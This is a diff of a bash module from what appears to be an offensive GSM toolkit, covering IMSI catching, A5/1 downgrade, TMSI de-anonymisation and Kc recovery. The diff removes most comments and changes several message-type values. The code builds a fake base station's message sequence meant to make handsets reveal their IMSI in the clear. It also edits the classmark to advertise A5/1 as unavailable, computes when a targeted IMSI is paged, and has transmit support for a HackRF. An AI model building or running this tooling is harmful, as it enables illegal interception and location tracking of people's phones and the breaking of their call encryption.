@@ -1,48 +1,7 @@
 #!/usr/bin/env bash
-# gsm attack — IMSI catcher logic, A5/1 downgrade, TMSI de-anonymisation, Kc recovery
-#
-# Honest split, and where the line currently falls.
-#
-# BUILT (a vector reports `status transmit-ready`). For each of the four
-# vectors the module builds the COMPLETE octet set — layer 3 messages, LAPDm
-# framing, the SCH information field, the classmark, the Cipher Mode Command —
-# and the frame schedule a driver would walk: which TDMA frame, which multiframe
-# offset, which logical channel, and which of the four bursts a 456-bit LAPDm
-# block becomes. The channel map is checked against TS 45.002 tables 4 and 5,
-# the burst layout against table 5.2.3-1, and the LAPDm header against TS 44.006
-# — all in --selftest, against the table text rather than against this code.
-#
-# BUILT, AND ON THE AIR. `--transmit <arfcn>` closes the loop the earlier
-# draft of this header admitted was open. It builds real System Information
-# octets (SI1/SI2/SI3/SI4), puts them through the xCCH channel coder — FIRE
-# CRC-40, the rate-1/2 K=5 convolutional code, the 456-bit interleave and the
-# four 116-bit bursts — lays them into a 51-frame multiframe with genuine FCCH
 # and SCH bursts, applies GMSK modulation, resamples to a rate a HackRF
 # accepts, and calls hackrf_transfer. With no radio attached it exits 3 and
-# names the device; it never prints a success line it did not earn.
-#
-# The transmit chain is asserted against an independent implementation, not
-# against this module's own output: `tools/gsm_mod.py selftest` checks every
-# coded vector against libosmocoding 1.7.0, and `tools/gsm_mod.py carrier
-# --format cfile` writes a stream that gr-gsm's own receiver decodes back to
-# the exact 23-octet blocks that went in, at the frame numbers they were
-# placed at. What that does NOT prove is that a handset camps on the carrier;
-# nobody has put this waveform on the air, and the BCCH LAPDm framing is an
-# unverified reading of TS 44.006 5.2. `--transmit` prints both as limits.
-#
-# STILL HANDOFF (the four plan files report `status handoff`). Those files
-# describe the whole attack, which is more than a broadcast carrier: they need
-# a receiver running at the same time to catch the RACH, and an operator on
 # licensed spectrum. --tx-ack prints the acknowledgement a driver takes before
-# keying a transmitter. `written` is not `works`; see docs/HANDOFF.md.
-#
-# BUILT AND INDEPENDENT OF ANY RADIO. The RACH->AGCH->SDCCH sequence, the
-# classmark codec, the paging arithmetic that predicts which CCCH block a given
-# IMSI must listen on, and the A5/1 / A5/2 keystream and key search are
-# performed for real and asserted against published vectors.
-#
-# Resolve IMSISTING_ROOT from this script's own path so state and loot land in
-# the project tree even when launched standalone via pkexec (no launcher env).
 if [[ -z "${IMSISTING_ROOT:-}" ]]; then
     _sl_src="${BASH_SOURCE[0]}"
     while [ -L "$_sl_src" ]; do
@@ -56,7 +15,6 @@ if [[ -z "${IMSISTING_ROOT:-}" ]]; then
     unset _sl_src _sl_dir _sl_tgt
 fi
 
-# Under pkexec HOME=/root even though we write to the invoking user's tree.
 if [[ -n "${IMSISTING_ROOT:-}" ]]; then
     _real_home="$(dirname "$IMSISTING_ROOT")"
     if [[ -n "$_real_home" && -d "$_real_home" && "$HOME" != "$_real_home" ]]; then
@@ -76,17 +34,14 @@ MOD_TMP="$TMP_DIR/gsm_attack"
 GATK_DIR="$LOOT_DIR/gsm_attack"
 mkdir -p "$MOD_TMP" "$GATK_DIR" 2>/dev/null
 
-# Shared cross-module state — other modules read these.
 GATK_SDR="${TMP_DIR}/sdr_device"
 GATK_ARFCN="${TMP_DIR}/target_arfcn"
 GATK_PLMN="${TMP_DIR}/target_plmn"
 
-# ── sanitisation ────────────────────────────────────────────────────────
 gatk_sanitize() {
     printf '%s' "${1:-}" | tr '\t\r\n' '   '
 }
 
-# ── hex helpers (same contract as 06_gsm_air.sh) ────────────────────────
 gatk_norm_hex() {
     printf '%s' "${1:-}" | tr -d ' \t\r\n:.-' | sed 's/^0x//I' | tr 'A-F' 'a-f'
 }
@@ -125,9 +80,6 @@ gatk_bits_to_hex() {
     printf '%s' "$out"
 }
 
-# ── hardware guards ─────────────────────────────────────────────────────
-# A transmitter is a different class of device from a receiver. An RTL-SDR
-# cannot transmit at all, so it must never satisfy a transmit guard.
 gatk_find_tx_sdr() {
     local d
     for d in hackrf bladerf usrp limesdr; do
@@ -155,8 +107,6 @@ gatk_find_rx_sdr() {
     return 1
 }
 
-# gr-gsm provides the transmitter side (grgsm_livemon + the burst_sender
-# flowgraphs); OsmocomBB needs a phone with the firmware loaded.
 gatk_find_gsm_stack() {
     for t in grgsm_livemon grgsm_decode osmocon mobile; do
         command -v "$t" >/dev/null 2>&1 && { echo "$t"; return 0; }
@@ -164,7 +114,6 @@ gatk_find_gsm_stack() {
     return 1
 }
 
-# The exact hardware each plan needs. Named, not implied.
 gatk_required_hardware() {
     case "${1:-}" in
         imsi-catcher)
@@ -179,9 +128,6 @@ gatk_required_hardware() {
     esac
 }
 
-# ── plan files: status handoff, never a fake success ────────────────────
-# A plan file is a TSV of KEY<TAB>VALUE lines with a status header. It is
-# labelled a plan because the vector needs hardware this module cannot assume.
 gatk_plan_path() { printf '%s/plan_%s.tsv' "$GATK_DIR" "${1:-}"; }
 
 gatk_write_plan() {
@@ -212,7 +158,6 @@ gatk_write_plan() {
     return 0
 }
 
-# The body of each plan: the real steps, in order, with the real parameters.
 gatk_plan_body() {
     case "${1:-}" in
         imsi-catcher) cat <<'EOF'
@@ -301,28 +246,23 @@ gatk_cmd_plan_tsv() {
     done
 }
 
-# ── IMSI catcher: the RACH -> AGCH -> SDCCH sequence (real construction) ─
-# This is the channel sequence an IMSI catcher must drive. The message
-# sequences are real TS 44.018 messages; we emit them as construction steps
-# with the channel each rides on. Building the bit-level bursts for the radio
-# is the handoff; deciding the sequence is not.
 gatk_imsi_catcher_sequence() {
     cat <<'EOF'
-step	channel	direction	message	message_type	purpose
-1	BCCH	DL	SYSTEM INFORMATION TYPE 1	0x19	clone the cell allocation and RACH control parameters
-2	BCCH	DL	SYSTEM INFORMATION TYPE 2	0x1a	clone the BCCH allocation (neighbour ARFCNs)
-3	BCCH	DL	SYSTEM INFORMATION TYPE 3	0x1b	clone the identity: MCC, MNC, LAC, CI, T3212, control channel description
-4	BCCH	DL	SYSTEM INFORMATION TYPE 4	0x1c	clone the LAC/CI and CBCH description
-5	BCCH	DL	SYSTEM INFORMATION TYPE 13	0x04	clone the GPRS cell options so GPRS-capable MSs camp
-6	RACH	UL	CHANNEL REQUEST	0x0c	the MS asks for a channel; 8 bits of random reference plus the establishment cause
-7	AGCH	DL	IMMEDIATE ASSIGNMENT	0x3f	grant an SDCCH/4 sub-channel (the combined configuration this vector clones) and a timing advance
-8	SDCCH	DL	PAGING REQUEST TYPE 1	0x21	optional: page the target by TMSI to make it answer on the assigned channel
-9	SDCCH	UL	PAGING RESPONSE	0x27	the MS identifies itself with its TMSI
-10	SDCCH	UL	CM SERVICE REQUEST	0x24	alternative path: the MS requests a service and sends its identity
-11	SDCCH	DL	IDENTITY REQUEST	0x05	ask for the IMSI explicitly, identity type = 001
-12	SDCCH	UL	IDENTITY RESPONSE	0x06	the MS returns its IMSI in the clear - the objective
-13	SDCCH	DL	CIPHER MODE COMMAND	0x35	optional: switch on A5/0 so the exchange is plaintext anyway
-14	SDCCH	DL	CHANNEL RELEASE	0x0d	release so the MS returns to the real network
+step	channel	direction	message	protocol	message_type	purpose
+1	BCCH	DL	SYSTEM INFORMATION TYPE 1	RR	0x19	clone the cell allocation and RACH control parameters
+2	BCCH	DL	SYSTEM INFORMATION TYPE 2	RR	0x1a	clone the BCCH allocation (neighbour ARFCNs)
+3	BCCH	DL	SYSTEM INFORMATION TYPE 3	RR	0x1b	clone the identity: MCC, MNC, LAC, CI, T3212, control channel description
+4	BCCH	DL	SYSTEM INFORMATION TYPE 4	RR	0x1c	clone the LAC/CI and CBCH description
+5	BCCH	DL	SYSTEM INFORMATION TYPE 13	RR	0x00	clone the GPRS cell options so GPRS-capable MSs camp
+6	RACH	UL	CHANNEL REQUEST	-	-	the MS asks for a channel; 8 bits of random reference plus the establishment cause
+7	AGCH	DL	IMMEDIATE ASSIGNMENT	RR	0x3f	grant an SDCCH/4 sub-channel (the combined configuration this vector clones) and a timing advance
+8	PCH	DL	PAGING REQUEST TYPE 1	RR	0x21	optional: page the target by TMSI to make it answer on the assigned channel
+9	SDCCH	UL	PAGING RESPONSE	RR	0x27	the MS identifies itself with its TMSI
+10	SDCCH	UL	CM SERVICE REQUEST	MM	0x24	alternative path: the MS requests a service and sends its identity
+11	SDCCH	DL	IDENTITY REQUEST	MM	0x18	ask for the IMSI explicitly, identity type = 001
+12	SDCCH	UL	IDENTITY RESPONSE	MM	0x19	the MS returns its IMSI in the clear - the objective
+13	SDCCH	DL	CIPHERING MODE COMMAND	RR	0x35	optional: switch on A5/0 so the exchange is plaintext anyway
+14	SDCCH	DL	CHANNEL RELEASE	RR	0x0d	release so the MS returns to the real network
 EOF
 }
 
@@ -330,13 +270,8 @@ gatk_cmd_imsi_catcher_sequence() {
     gatk_imsi_catcher_sequence
 }
 
-# ── the paging-response race, in frames ─────────────────────────────────
-# When both the real network and the fake cell page the same MS, the MS
-# answers whoever it hears first with a valid paging block assignment. The
-# race is decided in TDMA frames, so the attacker needs to be a few frames
-# ahead. One 51-frame multiframe is 51 * 4.615 ms = 235.4 ms.
-GATK_FRAME_MS="4.615"     # one TDMA frame, milliseconds
-GATK_MF_FRAMES="51"       # frames per 51-multiframe (CCCH)
+GATK_FRAME_MS="4.615"
+GATK_MF_FRAMES="51"
 
 gatk_paging_race() {
     local lead="${1:-3}"
@@ -357,12 +292,6 @@ gatk_paging_race() {
     }'
 }
 
-# ── C1 reselection arithmetic (real) ────────────────────────────────────
-# TS 45.008 section 6.4: C1 = (A - max(B, 0)) where
-#   A = RXLEV_ACCESS_MIN - RXLEV_AVG          (both in dBm)
-#   B = MS_TXPWR_MAX_CCH - P                  (both in dBm)
-# A cell is selectable only if C1 > 0. A fake cell wins reselection if its
-# C1 exceeds the serving cell's C1 for the 5-second reselection timer.
 gatk_c1() {
     local rxlev_access_min="${1:-}" rxlev_avg="${2:-}" ms_txpwr_max="${3:-}" p="${4:-}"
     [[ "$rxlev_access_min" =~ ^-?[0-9]+$ && "$rxlev_avg" =~ ^-?[0-9]+$ &&
@@ -382,26 +311,6 @@ gatk_c1() {
     }'
 }
 
-# ── classmark encoder (real, byte-exact) ────────────────────────────────
-# Mobile Station Classmark 2, TS 24.008 section 10.5.1.6, figure 10.5.6.
-# The IE is five octets: IEI 0x33, a length of 3, then three content octets.
-# Figure 10.5.6 numbers the bits 8..1 left to right, and bit 1 is the LSB:
-#
-#   octet 3:  0 | Revision(2) | ES IND | A5/1 | RF power capability(3)
-#   octet 4:  0 | PS capa | SS Screening Ind(2) | SM ca. | VBS | VGCS | FC
-#   octet 5:  CM3 | 0 | LCSVA CAP | UCS2 | SoLSA | CMSP | A5/3 | A5/2
-#
-# CORRECTED against the figure. This encoder previously put revision and RF
-# power capability where each other belongs, ES IND one bit low, PS
-# capability in the wrong octet, FC at bit 8 instead of bit 1, and spread
-# Classmark 2 octet 5 across three octets. Every earlier assertion passed
-# because the decoder mirrored the encoder: a self-consistent pair proves
-# only that the arithmetic round-trips, not that the bits are where the
-# network will look for them.
-#
-# A5/1 is INVERTED: bit 4 clear means A5/1 available, set means not
-# available. A5/4..A5/7 are Classmark 3 fields and are refused here rather
-# than silently dropped; `vbs` is likewise not a Classmark 2 field.
 gatk_classmark_encode() {
     local revision="${1:-3}" es_ind="${2:-0}" a51="${3:-1}" rfpow="${4:-3}"
     local ss_screen="${5:-1}" sm_cap="${6:-1}" vbs="${7:-0}" vgcs="${8:-0}"
@@ -420,9 +329,6 @@ gatk_classmark_encode() {
     done
     (( revision <= 3 && rfpow <= 7 && ss_screen <= 3 )) || {
         printf 'ERROR\trevision<=3, rfpow<=7, ss_screen<=3\n' >&2; return 2; }
-    # Fields that exist but do not belong in this information element. Say so
-    # rather than accept them and emit nothing, which is how a wrong octet
-    # travels unnoticed all the way to a handset.
     (( (a54 | a55 | a56 | a57) == 0 )) || {
         printf 'ERROR\tA5/4..A5/7 are Classmark 3 fields; Classmark 2 cannot carry them\n' >&2
         return 2; }
@@ -439,9 +345,6 @@ gatk_classmark_encode() {
     printf '33%02x%02x%02x%02x' 3 "$(( o3 & 0xff ))" "$(( o4 & 0xff ))" "$(( o5 & 0xff ))"
 }
 
-# Decode a Classmark 2 IE back into its fields, reading figure 10.5.6's bit
-# positions. The IEI is checked, so a Classmark 1 value octet handed to this
-# function is rejected instead of being decoded as a classmark 2.
 gatk_classmark_decode() {
     local hex; hex=$(gatk_norm_hex "${1:-}")
     [[ "$hex" =~ ^[0-9a-f]{10}$ ]] || {
@@ -478,7 +381,6 @@ gatk_classmark_decode() {
 gatk_cmd_classmark() {
     local hex="${1:-}"
     if [[ -z "$hex" ]]; then
-        # No argument: emit the default encoder output.
         local cm; cm=$(gatk_classmark_encode) || return 1
         printf 'classmark\t%s\n' "$cm"
         gatk_classmark_decode "$cm"
@@ -487,12 +389,6 @@ gatk_cmd_classmark() {
     gatk_classmark_decode "$hex"
 }
 
-# The downgrade edit: make the ME advertise that A5/1 is unavailable.
-# TS 24.008 10.5.1.5/10.5.1.6: A5/1 algorithm supported (bit 4)
-#   0 = encryption algorithm A5/1 available
-#   1 = encryption algorithm A5/1 not available
-# So the downgrade SETS the bit. The original cleared it, which advertises
-# A5/1 as *available* — the exact opposite of the operation's name.
 gatk_classmark_downgrade() {
     local hex; hex=$(gatk_norm_hex "${1:-}")
     [[ "$hex" =~ ^[0-9a-f]{10}$ ]] || {
@@ -501,7 +397,7 @@ gatk_classmark_downgrade() {
         printf 'ERROR\tnot a Mobile Station Classmark 2 IE: IEI 0x%s, expected 0x33\n' \
             "${hex:0:2}" >&2; return 2; }
     local o3=$(( 16#${hex:4:2} ))
-    local new_o3=$(( o3 | 8 ))          # octet 3 bit 4 = A5/1 not available
+    local new_o3=$(( o3 | 8 ))
     printf 'before\t%s\n' "$hex"
     printf 'after\t%s%02x%s\n' "${hex:0:4}" "$new_o3" "${hex:6}"
     printf 'cleared_field\ta5_1\n'
@@ -511,15 +407,6 @@ gatk_classmark_downgrade() {
     printf 'changed_note\t%s\n' "$([[ "$o3" != "$new_o3" ]] && echo 'the A5/1 bit was set' || echo 'already advertised as unavailable; nothing to do')"
 }
 
-# ── Identity Request construction (real bytes) ──────────────────────────
-# IDENTITY REQUEST, TS 44.018 section 9.1.15 / 10.5.2.20. RR message:
-#   octet 1: skip indicator (bits 5-8) | protocol discriminator (bits 1-4)
-#            -> 0x06 for Radio Resources (TS 24.007 11.2.3.1; 0x05 is MM)
-#   octet 2: message type = 0x05 (IDENTITY REQUEST)
-#   octet 3: identity type. In TS 44.018 the "Mobile Identity" IE here is a
-#            4-bit "type of identity" followed by 4 spare bits:
-#              001 IMSI, 010 IMEI, 011 IMEI+SVM, 100 TMSI
-#            transmitted as the low nibble = type, high nibble = spare (0).
 gatk_build_identity_request() {
     local type="${1:-1}"
     [[ "$type" =~ ^[0-9]+$ ]] || {
@@ -527,10 +414,9 @@ gatk_build_identity_request() {
     (( type >= 1 && type <= 4 )) || {
         printf 'ERROR\tidentity type %s out of range (1=IMSI 2=IMEI 3=IMEISV 4=TMSI)\n' "$type" >&2
         return 2; }
-    # octet 3: low nibble carries the type, high nibble is spare.
     local o3=$(( type & 0x0f ))
     printf 'message\tIDENTITY_REQUEST\n'
-    printf 'octets\t0605%02x\n' "$o3"
+    printf 'octets\t0518%02x\n' "$o3"
     printf 'identity_type\t%s\n' "$type"
     printf 'identity_name\t%s\n' "$(gatk_identity_name "$type")"
     printf 'purpose\t%s\n' "$([[ "$type" -eq 1 ]] && echo "force the MS to reveal its permanent IMSI in the clear" || echo "request a non-permanent identity")"
@@ -544,11 +430,6 @@ gatk_identity_name() {
     esac
 }
 
-# ── Kc recovery arithmetic (real) ───────────────────────────────────────
-# GSM A5/1 keystream budget: one burst is 114 cipher bits; a full frame is
-# 228 bits (114 in each direction). The two-known-plaintext attack needs
-# 2 frames. COMP128 reduces the effective key from 64 to 54 bits because it
-# sets the low 10 bits of Kc to zero.
 gatk_kc_recovery_facts() {
     printf 'burst_cipher_bits\t114\n'
     printf 'frame_bits\t228\n'
@@ -576,32 +457,13 @@ gatk_cmd_kc_recovery() {
     return 0
 }
 
-# ══════════════════════════════════════════════════════════════════════
-# Air-interface frame model
-#
-# Everything in the four vector drivers below is expressed against one clock:
-# the GSM TDMA hierarchy from TS 45.010 section 5. Getting this right is what
-# makes the transmit schedules real numbers instead of prose, so the numbers
-# are derived here from the single primitive that defines the whole system —
-# the bit period of 48/13 us — and the selftest asserts the derivations close
-# (a frame must equal eight slots, a 26-multiframe must equal 120 ms exactly).
-#
-#   bit period        48/13 us       = 3.692307... us
-#   timeslot          156.25 bits    = 15/26 ms    = 576.923 us
-#   TDMA frame        8 timeslots    = 60/13 ms    = 4.615385 ms
-#   26-multiframe     26 frames      = 120 ms      (traffic channels)
-#   51-multiframe     51 frames      = 235.385 ms  (control channels)
-#   superframe        26 * 51 frames = 1326 frames = 6.12 s
-#   hyperframe        2048 superframes            = 3.4816 h
-# ══════════════════════════════════════════════════════════════════════
 
-# The system's one primitive, kept as an exact fraction so nothing drifts.
 GATK_BIT_US_NUM=48
 GATK_BIT_US_DEN=13
 GATK_SLOT_BITS=156.25
-GATK_FRAMES_PER_SUPER=1326      # 26 * 51
-GATK_FRAMES_PER_HYPER=2715648   # 2048 * 1326
-GATK_MAX_FN=2715647             # hyperframe frame numbers are 0..2715647
+GATK_FRAMES_PER_SUPER=1326
+GATK_FRAMES_PER_HYPER=2715648
+GATK_MAX_FN=2715647
 
 gatk_frame_facts() {
     awk -v bn="$GATK_BIT_US_NUM" -v bd="$GATK_BIT_US_DEN" 'BEGIN{
@@ -628,15 +490,7 @@ gatk_frame_facts() {
     }'
 }
 
-# ── frame number <-> T1/T2/T3 (TS 45.002 section 4.3.3) ────────────────
-# The 22-bit frame number is carried over the air as three counters, which is
-# what lets a receiver resynchronise after a gap:
-#   T1 = FN / 1326         0..2047   11 bits   (superframe)
-#   T2 = FN mod 26         0..25      5 bits   (traffic multiframe)
-#   T3 = FN mod 51         0..50      6 bits   (control multiframe)
-# and recombines as FN = 1326*T1 + 51*((T3 - T2) mod 26) + T3, which is the
-# form that recovers the control-multiframe phase T3 from T2.
-gatk_fn_split() {   # <frame-number>
+gatk_fn_split() {
     local fn="${1:-}"
     [[ "$fn" =~ ^[0-9]+$ ]] || {
         printf 'ERROR\tframe number must be a non-negative integer\n' >&2; return 2; }
@@ -653,7 +507,7 @@ gatk_fn_split() {   # <frame-number>
     }'
 }
 
-gatk_fn_join() {   # <t1> <t2> <t3>
+gatk_fn_join() {
     local t1="${1:-}" t2="${2:-}" t3="${3:-}"
     [[ "$t1" =~ ^[0-9]+$ && "$t2" =~ ^[0-9]+$ && "$t3" =~ ^[0-9]+$ ]] || {
         printf 'ERROR\tT1, T2 and T3 must be non-negative integers\n' >&2; return 2; }
@@ -666,8 +520,7 @@ gatk_fn_join() {   # <t1> <t2> <t3>
     }'
 }
 
-# Where a frame sits in its multiframes, which is what a scheduler budgets in.
-gatk_fn_phase() {   # <frame-number>
+gatk_fn_phase() {
     local fn="${1:-}"
     [[ "$fn" =~ ^[0-9]+$ ]] || {
         printf 'ERROR\tframe number must be a non-negative integer\n' >&2; return 2; }
@@ -682,16 +535,10 @@ gatk_fn_phase() {   # <frame-number>
     }'
 }
 
-# ── timing advance (TS 45.010 section 5.5) ─────────────────────────────
-# The MS advances its uplink by TA bit periods so its burst lands in the
-# right slot at the BTS. One TA step is one bit period of round-trip path,
-# so the one-way range is c * (48/13 us) / 2.
-gatk_ta() {   # <units> [gsm400]
+gatk_ta() {
     local units="${1:-0}" band="${2:-}"
     [[ "$units" =~ ^[0-9]+$ ]] || {
         printf 'ERROR\tTA must be a whole number of bit periods\n' >&2; return 2; }
-    # TS 45.010 5.5: TAmax = 63 for every band except GSM 400, where the
-    # extended timing advance information element raises it to 219.
     local max=63
     [[ "$band" == "gsm400" || "$band" == "1" ]] && max=219
     (( units <= max )) || {
@@ -717,20 +564,6 @@ gatk_ta() {   # <units> [gsm400]
     }'
 }
 
-# ── the 51-multiframe map on timeslot 0 (TS 45.002 Table 3) ─────────────
-# The control-channel multiframe is 51 frames long and its TS0 layout is
-# fixed, not signalled. Every offset below is a frame number modulo 51, so a
-# transmitter does not need to negotiate anything to know where to be:
-#
-#   offset  0     10     20     30     40     FCCH  (frequency correction)
-#   offset  1     11     21     31     41     SCH   (BSIC + frame number)
-#   offset  2..5                              BCCH Norm
-#   offset  6..9 12..15 16..19 22..25 26..29  CCCH blocks 0..4
-#          32..35 36..39 42..45 46..49        CCCH blocks 5..8
-#   offset 50                                 idle
-#
-# The nine CCCH blocks are the whole point: PCH and AGCH share them, and
-# BS_AG_BLKS_RES of them, counted from block 0, are reserved for AGCH.
 GATK_FCCH_OFFSETS=(0 10 20 30 40)
 GATK_SCH_OFFSETS=(1 11 21 31 41)
 GATK_BCCH_OFFSETS=(2 3 4 5)
@@ -738,11 +571,9 @@ GATK_CCCH_FIRST=(6 12 16 22 26 32 36 42 46)
 GATK_CCCH_BLOCKS=9
 GATK_CCCH_BURSTS=4
 
-# Table 3 lists the CCCH blocks as B0(6..9) B1(12..15) B2(16..19) B3(22..25)
-# B4(26..29) B5(32..35) B6(36..39) B7(42..45) B8(46..49).
 GATK_CCCH_FRAME_TABLE='6 12 16 22 26 32 36 42 46'
 
-gatk_ccch_first() {   # <block 0..8> -> first frame offset in the 51-multiframe
+gatk_ccch_first() {
     local k="${1:-}"
     [[ "$k" =~ ^[0-9]+$ ]] && (( k >= 0 && k < GATK_CCCH_BLOCKS )) || return 2
     set -- $GATK_CCCH_FRAME_TABLE
@@ -769,17 +600,7 @@ gatk_multiframe_map() {
     printf '50\tidle\t-\t0\t-\tunused\n'
 }
 
-# BS_AG_BLKS_RES reserves access-grant blocks from block 0 upward, so the
-# paging blocks are the tail of the CCCH block list.
-# ── CCCH_CONF: how many CCCHs, and whether SDCCH/4 shares the channel ───
-# TS 45.002 section 3.3.2.3 a). The BCCH advertises a 3-bit CCCH_CONF and
-# everything downstream — how many blocks the paging arithmetic may use, and
-# which TDMA frames carry RACH — follows from it. Getting this wrong is not a
-# rounding error: on a combined cell (CCCH_CONF = 001, the usual configuration
-# for a small or indoor BTS) there are only THREE CCCH blocks in the
-# 51-multiframe, so paging-group arithmetic run against nine blocks lands on a
-# frame that is carrying SDCCH/4.
-gatk_ccch_conf() {   # <ccch-conf 000|001|010|100|110>
+gatk_ccch_conf() {
     local c="${1:-000}"
     case "$c" in
         000) printf 'ccch_conf\t000\nbs_cc_chans\t1\nbs_ccch_sdcch_comb\tfalse\npaging_blocks_max\t9\nnote\tsingle CCCH, no SDCCH/4 sharing\n' ;;
@@ -791,26 +612,14 @@ gatk_ccch_conf() {   # <ccch-conf 000|001|010|100|110>
     esac
 }
 
-# TS 45.002 Table 5, clause 7. In the combined configuration only B0, B1 and
-# B2 remain common control blocks; B3..B8 carry SDCCH/4(0..3) at frames
-# 22..39 and SACCH/C4(0..3) at 42..49, which is exactly what Table 4 maps
-# those blocks to. The first three entries of the normal CCCH frame table are
-# 6, 12, 16 — B0, B1, B2 — so the arithmetic below is unchanged, but the
-# *ceiling* on BS_AG_BLKS_RES and on the paging block count is 3, not 9.
 GATK_CCCH_COMB_BLOCKS=3
 
-gatk_ccch_blocks_available() {   # [combined true|false]
+gatk_ccch_blocks_available() {
     local comb="${1:-false}"
     if [[ "$comb" == true ]]; then echo "$GATK_CCCH_COMB_BLOCKS"; else echo "$GATK_CCCH_BLOCKS"; fi
 }
 
-# TS 45.002 Table 5, clause 7, "Random access channel blocks available".
-# Not combined: every TDMA frame B0..B50 carries a RACH opportunity on the
-# uplink. Combined: the uplink half of TS0 is taken by SDCCH/4 UL
-# B(37..40),(41..44),(47..50),(0..3) and SACCH/C4 UL B(57..60),(61..64) —
-# i.e. frames 6..13 modulo 51 — leaving 4, 5, 14..36, 45 and 46. That is the
-# list the table elides as "B4, B5, B14, B15 ... B36, B45, B46": 27 frames.
-gatk_rach_blocks() {   # [combined true|false]
+gatk_rach_blocks() {
     local comb="${1:-false}" f
     printf 'combined\t%s\n' "$comb"
     printf 'frame_count\t'
@@ -825,7 +634,7 @@ gatk_rach_blocks() {   # [combined true|false]
     fi
 }
 
-gatk_ccch_blocks() {   # [bs-ag-blks-res 0..7] [combined true|false]
+gatk_ccch_blocks() {
     local res="${1:-0}" comb="${2:-false}"
     [[ "$res" =~ ^[0-9]+$ ]] && (( res <= 7 )) || {
         printf 'ERROR\tBS_AG_BLKS_RES must be 0..7 (got %s)\n' "$res" >&2; return 2; }
@@ -848,14 +657,7 @@ gatk_ccch_blocks() {   # [bs-ag-blks-res 0..7] [combined true|false]
     done
 }
 
-# ── paging group arithmetic (TS 45.002 section 6.5.2, idle mode, non-eDRX) ──
-#   CCCH_GROUP   (0 .. BS_CC_CHANS-1) = ((IMSI mod 1000) mod (BS_CC_CHANS x N)) div N
-#   PAGING_GROUP (0 .. N-1)           = ((IMSI mod 1000) mod (BS_CC_CHANS x N)) mod N
-#   N = (paging blocks available per 51-multiframe on one CCCH) x BS_PA_MFRMS
-#
-# Note the modulus is 1000, not 1024. The last three digits of the IMSI are
-# taken directly so the value is exact regardless of shell arithmetic width.
-gatk_paging_group() {   # <imsi 6..15 digits> <bs-pa-mfrms 2..9> <paging-blocks-per-51mf 1..9> [bs-cc-chans 1..4] [combined true|false]
+gatk_paging_group() {
     local imsi="${1:-}" pam="${2:-}" pblocks="${3:-}" chans="${4:-1}" comb="${5:-false}"
     [[ "$imsi" =~ ^[0-9]{6,15}$ ]] || {
         printf 'ERROR\tIMSI must be 6 to 15 digits (got %s)\n' "$imsi" >&2; return 2; }
@@ -885,14 +687,7 @@ gatk_paging_group() {   # <imsi 6..15 digits> <bs-pa-mfrms 2..9> <paging-blocks-
     }'
 }
 
-# ── which multiframe and which block (TS 45.002 section 6.5.3) ───────────
-#   the required 51-multiframe has   (FN div 51) mod BS_PA_MFRMS = PAGING_GROUP div (N div BS_PA_MFRMS)
-#   and the block within it is       PAGING_GROUP mod (N div BS_PA_MFRMS)
-# N div BS_PA_MFRMS is just the number of paging blocks per multiframe, so the
-# cycle position is PAGING_GROUP div pblocks and the block index is
-# PAGING_GROUP mod pblocks. The block index is then offset past the AGCH
-# blocks reserved at the head of the CCCH.
-gatk_paging_schedule() {   # <imsi> <bs-pa-mfrms> <bs-ag-blks-res> <paging-blocks-per-51mf> [bs-cc-chans] [start-fn] [combined]
+gatk_paging_schedule() {
     local imsi="${1:-}" pam="${2:-}" res="${3:-0}" pblocks="${4:-}" chans="${5:-1}" start="${6:-0}" comb="${7:-false}"
     [[ "$res" =~ ^[0-9]+$ ]] && (( res <= 7 )) || {
         printf 'ERROR\tBS_AG_BLKS_RES must be 0..7 (got %s)\n' "$res" >&2; return 2; }
@@ -940,8 +735,7 @@ gatk_paging_schedule() {   # <imsi> <bs-pa-mfrms> <bs-ag-blks-res> <paging-block
     }'
 }
 
-# ── dedicated channel block mapping (TS 45.002 Tables 3 and 4) ──────────
-gatk_sdcch_map() {   # [4|8] — SDCCH/4 is the combined BCCH+SDCCH layout
+gatk_sdcch_map() {
     local kind="${1:-4}"
     case "$kind" in
         4) cat <<'EOF'
@@ -980,8 +774,7 @@ EOF
     esac
 }
 
-# Which 51-multiframe offsets carry a given SDCCH sub-channel, downlink.
-gatk_sdcch_block_frames() {   # <4|8> <subchannel>
+gatk_sdcch_block_frames() {
     local kind="${1:-4}" sub="${2:-0}" dl ul
     if [[ "$kind" == 4 ]]; then
         [[ "$sub" =~ ^[0-3]$ ]] || { printf 'ERROR\tSDCCH/4 sub-channel must be 0..3\n' >&2; return 2; }
@@ -1004,16 +797,7 @@ gatk_sdcch_block_frames() {   # <4|8> <subchannel>
     printf 'bursts_per_block\t4\n'
 }
 
-# ── the SCH payload (TS 45.002 section 3.3.2.2.1) ───────────────────────
-# 25 information bits before channel coding: BSIC (6) plus the reduced TDMA
-# frame number RFN (19) = T1 (11) | T2 (5) | T3' (3).
-#     T1  = FN div 1326        T2 = FN mod 26
-#     T3  = FN mod 51          T3' = (T3 - 1) div 10
-# T3' is only three bits, which would be lossy, except that the SCH is only
-# ever transmitted on multiframe offsets 1, 11, 21, 31, 41 — and those are
-# exactly the frames with T3 = 1, 11, 21, 31, 41, so T3' is lossless there and
-# TS 45.010 section 5.5 recovers T3 = 10 * T3' + 1 exactly.
-gatk_sch_payload() {   # <bsic 0..63> <frame-number>
+gatk_sch_payload() {
     local bsic="${1:-}" fn="${2:-}"
     [[ "$bsic" =~ ^[0-9]+$ ]] && (( bsic <= 63 )) || {
         printf 'ERROR\tBSIC must be 0..63 (got %s)\n' "$bsic" >&2; return 2; }
@@ -1022,14 +806,6 @@ gatk_sch_payload() {   # <bsic 0..63> <frame-number>
     (( fn <= GATK_MAX_FN )) || {
         printf 'ERROR\tframe number %s exceeds the hyperframe maximum %s\n' "$fn" "$GATK_MAX_FN" >&2
         return 2; }
-    # The SCH is only transmitted where T3 = FN mod 51 is one of 1, 11, 21, 31
-    # or 41 — the frames the 51-multiframe map puts on the synchronisation
-    # channel. T3' is lossy by construction: (T3-1) div 10 maps the whole
-    # decade 1..10, 11..20, ... onto one 3-bit code, so a receiver recovers
-    # the decade's *first* frame, not whatever frame it happened to be given.
-    # That is why the payload is computed for the SCH frame and the answer
-    # says so; handing this function a traffic frame is a caller error, and
-    # it exits non-zero rather than quietly returning a different FN.
     local out rc
     out=$(awk -v bsic="$bsic" -v fn="$fn" 'BEGIN{
         t1 = int(fn / 1326); t2 = fn % 26; t3 = fn % 51
@@ -1083,11 +859,7 @@ gatk_sch_payload() {   # <bsic 0..63> <frame-number>
     return $rc
 }
 
-# ── burst layouts (TS 45.002 sections 5.2.3 to 5.2.7) ───────────────────
